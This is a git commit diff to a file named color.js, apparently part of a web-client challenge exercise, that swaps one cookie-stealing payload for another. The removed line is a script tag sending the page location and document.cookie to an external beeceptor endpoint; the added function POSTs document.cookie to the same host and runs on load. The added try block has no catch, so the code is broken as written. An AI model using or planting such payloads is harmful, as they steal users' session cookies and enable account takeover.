4e51f0d0c0675f9c418d8b281216da93cdc95aaf
blaisedubs6 <104782871+blaisedubs6@users.noreply.github.com>
2026-04-06 16:43:17 +0200

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,2 +1,16 @@
-<script SRC = "https://recept.free.beeceptor.com?'+'location='+document.location+'&cookie='+document.cookie+'"></script>;
-
+async function envoyerDonnees() {
+  try {
+    const response = await fetch("https://recept.free.beeceptor.com/g", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        cookie: document.cookie,
+        age: 25
+      })
+    });
+  }
+}
+envoyerDonnees();
+  
